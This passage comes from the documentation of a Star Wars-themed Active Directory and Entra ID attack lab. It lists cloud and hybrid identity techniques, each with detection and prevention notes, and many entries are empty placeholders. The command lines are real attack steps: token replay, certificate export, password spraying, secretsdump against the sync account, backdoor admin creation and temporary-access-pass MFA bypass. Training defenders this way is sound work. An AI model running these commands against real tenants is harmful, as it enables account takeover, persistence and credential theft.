**Detection:** Audit logs showing multiple registrations in a short timeframe from a single user.
**Prevention:** Enforce MFA for device registration and limit registration rights to specific users.

---

### CLO-024 — Entra ID conditional access token replay
**What it is:** Access tokens and session cookies hijacked from trusted/compliant devices can be replayed to bypass access controls.
**Why it works here:** Lack of Token Binding or continuous authentication checks.
**Tools:** `TokenTactics`, `ROADtools`.
**Steps:**
```bash
roadrecon auth --access-token <stolen_token>
```
**Detection:** Anomalous connections showing matching session identifiers from divergent geographic IP addresses.
**Prevention:** Implement Continuous Access Evaluation (CAE) and enforce device compliance requirements.

---

### CLO-025 — Hybrid join machine certificate trust
**What it is:** Exportable machine certificates used for hybrid join allow attackers to clone device identities and bypass compliant device checks.
**Why it works here:** Private key of device certificate is marked as exportable.
**Tools:** `Export-PfxCertificate`.
**Steps:**
```powershell
Get-ChildItem Cert:\LocalMachine\My | Export-PfxCertificate -Password $pwd -FilePath device.pfx
```
**Detection:** Event ID 1006 indicating private key export of machine certificates.
**Prevention:** Configure non-exportable certificate templates for device enrollment. Store keys in TPM.

---

### CLO-026 — WHFB (Windows Hello for Business) key abuse
**What it is:** Registering an unauthorized public key inside the user's `msDS-KeyCredentialLink` attribute allows certificate authentication (PKINIT) as that user.
**Why it works here:** Write permission delegated on the msDS-KeyCredentialLink attribute of target users.
**Tools:** `pywhfb`.
**Steps:**
```bash
python3 pywhfb.py --target tatooine$ --dc-ip 10.10.0.10
```
**Detection:** Event ID 5136 indicating modification of `msDS-KeyCredentialLink`.
**Prevention:** Limit write permission on user computer object attributes in Active Directory.

---

### CLO-027 — Entra ID SSPR account takeover
**What it is:** Self-Service Password Reset (SSPR) settings accepting weak methods or relying on compromised on-premises synchronized objects.
**Why it works here:** Insecure authentication methods allowed for SSPR.
**Tools:** Web browser.
**Steps:**
```bash
# Trigger SSPR flow for a user via public SSPR portal
```
**Detection:** SSPR audit logs indicating password resets from anomalous IP locations.
**Prevention:** Configure strong password reset methods and enforce MFA registration policies.

---

### CLO-028 — Entra ID password spray via legacy auth (Basic auth)
**What it is:** Legacy authentication protocols do not support MFA. Attacking legacy endpoints allows bypassing access control policies.
**Why it works here:** Legacy authentication (SMTP/IMAP) enabled in the tenant.
**Tools:** `o365spray`.
**Steps:**
```bash
python3 o365spray.py --spray --userfile users.txt --password 'SithLord123!' --domain corplab.onmicrosoft.com --protocol activesync
```
**Detection:** A high frequency of failed logins to legacy endpoints in Entra ID sign-in logs.
**Prevention:** Disable legacy authentication protocols globally in Entra ID.

---

### CLO-029 — Token theft via evilginx2 / modlishka reverse proxy
**What it is:** Reverse proxy phishing tools intercept authentication requests, capturing plaintext passwords and session cookies.
**Why it works here:** Lack of FIDO2 phishing-resistant authentication.
**Tools:** `evilginx2`.
**Steps:**
```bash
sudo evilginx2
```
**Detection:** Sign-ins with valid MFA sessions from external untrusted proxy IP locations.
**Prevention:** Deploy phishing-resistant MFA (FIDO2 / WebAuthn / certificate-based authentication).

---

### CLO-030 — OAuth token leakage via hybrid app
**What it is:** Consent prompts granting excessive API permissions to malicious multi-tenant applications leads to persistent resource access.
**Why it works here:** User consent enabled for all applications.
**Tools:** Malicious App Consent.
**Steps:**
```bash
# Lure user to authorize application consent prompt
```
**Detection:** Audit events for 'Consent to application' indicating high-privilege access permissions.
**Prevention:** Disable user-level consent. Enforce administrator approval for all application registrations.

---

### CLO-031 — Device Registration Client Secret Leak
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-032 — TPM Attestation Bypass for Hybrid Join
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-033 — Fake Device Joined via Spoofed Attestation
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-034 — MDM Enrollment Policy Bypass
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-035 — Device Certificate Private Key Extraction
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-036 — Intune Enrollment Credential Stealing
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-037 — Autopilot Profile Manipulation
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-038 — Device Compliance Spoofing via MDM agent
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-039 — Unencrypted Device Enrollment Traffic
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-040 — Device MFA Enforcement Bypass
**What it is:** Reserved device registration and enrollment surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-041 — Entra ID App Registration Client Secret Theft
**What it is:** Storing application credentials or client secrets in plaintext settings files allows unauthorized API access.
**Why it works here:** Secrets stored in configuration files (appsettings.json, web.config).
**Tools:** Azure CLI.
**Steps:**
```bash
az ad app list --all
# Exchange secret for token:
curl -X POST https://login.microsoftonline.com/<tenant_id>/oauth2/v2.0/token -d "client_id=<client_id>&scope=https://graph.microsoft.com/.default&client_secret=<client_secret>&grant_type=client_credentials"
```
**Detection:** Token generation events using client secrets from unexpected administrative IPs.
**Prevention:** Store application secrets securely in Key Vaults and use Managed Identities.

---

### CLO-042 — Consent Grant Policy Misconfiguration
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-043 — Multi-Tenant Application Abuse
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-044 — Malicious App Consent Phishing
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-045 — Application Administrator Privilege Abuse
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-046 — Cloud Application Impersonation
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-047 — Client Certificate Leak from App Registration
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-048 — Redirect URI Hijacking in App Registration
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-049 — Application Password Credentials Leakage
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-050 — Excessive Graph API Permissions on App Registration
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-051 — Implicit Flow Id Token Spoofing
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-052 — App Registration Owner Hijacking
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-053 — Application Key Credentials Misconfiguration
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-054 — Device Code Flow Phishing
**What it is:** Reserved App Registration API permission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-055 — Entra ID Service Principal Abuse
**What it is:** Over-privileged service principals with Application.ReadWrite.All or Directory.ReadWrite.All can be hijacked to elevate privileges.
**Why it works here:** Excessive API permissions assigned to a service principal.
**Tools:** AzureAD PowerShell.
**Steps:**
```powershell
Import-Module AzureAD
New-AzureADServicePrincipalPasswordCredential -ObjectId <SP_ID> -Value 'Pwned123!'
```
**Detection:** Adding password credentials to a service principal from an anomalous administrative session.
**Prevention:** Audit API permissions regularly. Restrict access to Service Principal owner configurations.

---

### CLO-056 — Service Principal Owner Hijacking
**What it is:** Reserved service principal and admin consent surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-057 — Service Principal Role Assignment Abuse
**What it is:** Reserved service principal and admin consent surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-058 — Enterprise Application Credentials Theft
**What it is:** Reserved service principal and admin consent surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-059 — Admin Consent Bypass on Service Principal
**What it is:** Reserved service principal and admin consent surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-060 — Service Principal Certificate Mismanagement
**What it is:** Reserved service principal and admin consent surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-061 — Conditional Access Policy Bypass Techniques
**What it is:** Bypassing CA policies using legacy auth protocols, device compliance spoofing, or location manipulation.
**Why it works here:** CA policies configured with exceptions or missing legacy auth blocking.
**Tools:** `AADInternals`.
**Steps:**
```powershell
Invoke-AADIntPhishing -Recipients luke.skywalker@empire.local -Subject "Password Reset" -LinkText "Reset Password" -Sender "it@empire.local"
```
**Detection:** Anomalous sign-ins marked as successful CA verification from unrecognized IPs.
**Prevention:** Ensure CA policies block legacy auth, enforce compliant devices, and restrict exceptions.

---

### CLO-062 — Legacy Authentication Allowed for Guest Accounts
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-063 — MFA Registration Policy Bypass
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-064 — Trusted Location Spoofing
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-065 — Device Compliance Bypass via Header Injection
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-066 — Conditional Access Exception Group Abuse
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-067 — Device State Policy Bypass
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-068 — External Identity B2B Policy Bypass
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-069 — Conditional Access Policy Disabled / Not Enforced
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-070 — MFA Fatigue (Push Notification Spam)
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-071 — Azure Token Theft and Replay
**What it is:** Access and refresh tokens cached locally on developer endpoints can be extracted and replayed offline.
**Why it works here:** CLI or PowerShell caches tokens in local profiles.
**Tools:** `TokenTactics`.
**Steps:**
```powershell
Invoke-RefreshToMSGraphToken -RefreshToken <rt> -tenantid <tid>
```
**Detection:** Graph API operations performed using stolen tokens from unrecognized external networks.
**Prevention:** Enforce short session lifetimes and use Continuous Access Evaluation (CAE).

---

### CLO-072 — Refresh Token Theft from Storage
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-073 — Session Hijacking via Stolen Cookie
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-074 — Access Token Extraction from Memory
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-075 — FOCI (Family of Client IDs) Token Abuse
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-076 — Graph API Token Exfiltration
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-077 — Azure Resource Manager (ARM) Token Theft
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-078 — Token Replay via Compromised API Gateway
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-079 — Azure CLI Token Cache Extraction
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-080 — SSO Cookie Replay
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-081 — On-Prem → Cloud Escalation Chain
**What it is:** Full escalation chain moving from Active Directory compromise to hybrid synchronization decryption to global tenant takeover.
**Why it works here:** AD Sync decryption keys are readable by Domain Administrator.
**Tools:** `impacket-secretsdump`, `AADInternals`.
**Steps:**
```bash
impacket-secretsdump EMPIRE/MSOL_sync:EntraSync2024!@10.10.0.10
# Retrieve credentials using AADInternals:
Get-AADIntSyncCredentials -Server coruscant.empire.local
# Authenticate to Azure AD:
Connect-AzureAD -TenantId <tenant_id> -AccountId admin@corplab.onmicrosoft.com
```
**Detection:** Exporting sync database encryption keys or reading sensitive sync secrets.
**Prevention:** Enforce strict Tier 0 separation on the sync server and limit sync account privileges.

---

### CLO-082 — ADSync Encryption Bypass
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-083 — On-Premises AD CS ADCS Integration Abuse
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-084 — Azure AD Connect Health Agent Privilege Escalation
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-085 — Federated Domain Backdoor (Active Directory Federation Services)
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-086 — SAML Token Forgery (Golden SAML)
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-087 — ADFS Certificate Private Key Theft
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-088 — ADFS Trust Relationship Manipulation
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-089 — Hybrid Identity Writeback Abuse
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-090 — Azure Arc Server Identity Theft
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-091 — AADInternals Toolkit Attacks / Kill AD sync
**What it is:** Abusing administrative permissions to disable Pass-Through Authentication or disrupt synchronization services via AADInternals.
**Why it works here:** Sync admin credentials compromised.
**Tools:** `AADInternals`.
**Steps:**
```powershell
Set-AADIntPassThroughAuthenticationEnabled -Enabled $false
```
**Detection:** Audit events indicating disabling of PTA or sync status changes.
**Prevention:** Restrict Hybrid Identity Administrator role assignments.

---

### CLO-092 — Create backdoor admin user in Entra ID
**What it is:** Creating administrative accounts using compromised synchronization credentials to establish persistence.
**Why it works here:** Compromised write permission over the tenant directory.
**Tools:** `AADInternals`.
**Steps:**
```powershell
New-AADIntUser -UserPrincipalName backdoor@corplab.onmicrosoft.com -Password BackdoorPwd1 -DisplayName Backdoor -UserType Member
```
**Detection:** Creation of cloud-only administrative accounts without matching on-premises sync events.
**Prevention:** Enforce strict tenant user creation guidelines and alert on cloud-only admin creations.

---

### CLO-093 — Set temporary access pass (bypass MFA)
**What it is:** Registering a Temporary Access Pass (TAP) on a victim's account to bypass Multi-Factor Authentication.
**Why it works here:** Administrative access to user authentication methods.
**Tools:** `AADInternals`.
**Steps:**
```powershell
New-AADIntUserTemporaryAccessPass -UserPrincipalName victim@corplab.onmicrosoft.com
```
**Detection:** Audit logs showing addition of Temporary Access Pass authentication methods.
**Prevention:** Restrict and monitor TAP policy configurations and assignments.

---

### CLO-094 — Extract Entra ID join device certificates
**What it is:** Extracting device registration certificates for hybrid-joined endpoints to simulate trusted connections.
**Why it works here:** Read access allowed to device registration objects.
**Tools:** `AADInternals`.
**Steps:**
```powershell
Get-AADIntHybridDeviceCertificate
```
**Detection:** Directory queries requesting hybrid device certificate objects.
**Prevention:** Harden on-premises storage of device configuration values.

---

### CLO-095 — Pass-the-PRT
**What it is:** Using a stolen Primary Refresh Token (PRT) to request access tokens, maintaining persistence without MFA.
**Why it works here:** PRT token stolen from CloudAP cache.
**Tools:** `AADInternals`.
**Steps:**
```powershell
Get-AADIntPRTToken -DeviceID <id> -Certificate <cert>
```
**Detection:** Successful logins using token signatures not matching local device telemetry.
**Prevention:** Enforce device compliance and restrict token lifetimes.

---

Next: [`04-lateral-movement.md`](04-lateral-movement.md).

---

# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping

Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.

## The Galactic Topology

The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.

```mermaid
graph TD
    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;

    subgraph The Galactic Empire (empire.local)
        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
        Coruscant -- "Imperial Command" --> DeathStar
        Coruscant --- Scarif
        Coruscant --- Kamino
        Coruscant --- Endor
        Coruscant --- Mandalore
    end

    subgraph The Rebel Alliance (rebel.local)
        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
    end

    subgraph The Trade Federation (trade.corp)
        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
    end

    Coruscant <-->|Espionage / External Trust| Yavin4
    Coruscant <-->|Treaty / Forest Trust| Neimoidia
```

## Infrastructure Mapping

Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:

### 1. The Core Domains
* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.

### 2. High-Value Targets (Servers)
* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.

### 3. Attack Paths and Tactics
